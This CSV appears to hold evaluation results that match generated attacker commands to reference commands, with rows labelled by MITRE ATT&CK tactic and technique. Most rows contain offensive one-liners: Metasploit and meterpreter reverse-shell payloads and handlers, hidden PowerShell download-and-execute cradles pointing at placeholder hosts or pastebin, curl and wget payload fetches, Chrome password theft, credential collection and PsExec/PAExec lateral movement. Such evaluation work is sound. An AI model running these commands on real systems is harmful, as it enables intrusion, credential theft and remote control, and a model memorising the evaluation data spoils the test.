file,tool,input_command,matched_command,edit_score,match_found
command_chrome_passwords_TA0007_T1087.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
command_metasploit_TA0001_T1190.txt,metasploit,"msfconsole -x ""use exploit/multi/http/... ; set RHOST 192.168.0.4 ; set RPORT 80 ; set PAYLOAD windows/meterpreter/reverse_tcp ; run""",[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.45,True
command_metasploit_TA0003_T1543.txt,metasploit,"meterpreter > reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows"" /v ""RandomServiceName"" /t REG_SZ /d ""<random_service_name>""",[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,0.351,True
command_metasploit_TA0004_T1543.txt,metasploit,"msfconsole -x ""use windows/service/powershell_service; set PAYLOAD windows/powershell_reverse_tcp; set LHOST <attacker_IP>; set LPORT <attacker_port>; exploit""",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,0.493,True
command_metasploit_TA0004_T1543.txt,metasploit,"msfconsole -x ""use windows/service/service_install; set SERVICE_NAME <service_name>; set SERVICE_DESCRIPTION <service_description>; set PATH_TO_SCRIPT <script_path>; exploit"""," ```
    set payload windows/x64/meterpreter_reverse_https
    set lport 80
    set ExitOnSession False
    exploit -j
```",0.311,True
command_metasploit_TA0005_T1027.txt,metasploit,msf6 > use exploit/http/foscam_rce,`msf> loot -t screenspy.screenshot`,0.406,True
command_metasploit_TA0011_T1105.txt,metasploit,fetch_payload linux http/x64/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.516,True
command_metasploit_TA0011_T1105.txt,metasploit,fetch_payload windows http/x64/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.585,True
command_metasploit_TA0011_T1105.txt,metasploit,fetch_payload linux https/x64/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.527,True
command_metasploit_TA0011_T1105.txt,metasploit,curl -o <file_path> 'https://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp',[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.418,True
command_metasploit_TA0011_T1105.txt,metasploit,wget -O <file_path> 'http://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp',[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.421,True
command_metasploit_TA0011_T1105.txt,metasploit,"powershell -nop -w hidden -c ""iex ((New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/<paste_id>'))""","[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysinternalsSuite.zip""`",0.315,True
command_metasploit_TA0011_T1105.txt,metasploit,"powershell -nop -w hidden -c ""iex ((New-Object System.Net.WebClient).DownloadString('http://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp'))""",[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.283,True
command_metasploit_TA0011_T1105.txt,metasploit,"powershell -nop -w hidden -c ""iex ((New-Object System.Net.WebClient).DownloadString('https://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp'))""",[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.282,True
command_metasploit_TA0011_T1105.txt,metasploit,"powershell -nop -w hidden -c ""iex ((New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/<paste_id>'))""","[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysinternalsSuite.zip""`",0.315,True
command_paexec_TA0002_T1569.txt,paexec,PAExec \\<target_server> -u <username> -p <password> -i -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.418,True
command_paexec_TA0005_T1036.txt,paexec,paexec -i -s mstdc," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.212,True
command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -s cmd.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.198,True
command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -u {username} -p {password} -i -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.351,True
command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -u {username} -p {password} -l -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.351,True
command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -u {username} -p {password} -h -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.361,True
command_psexec_TA0001_T1078.txt,psexec,psexec -i \\<remote_system> -u <attacker_username> -p <attacker_password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",0.342,True
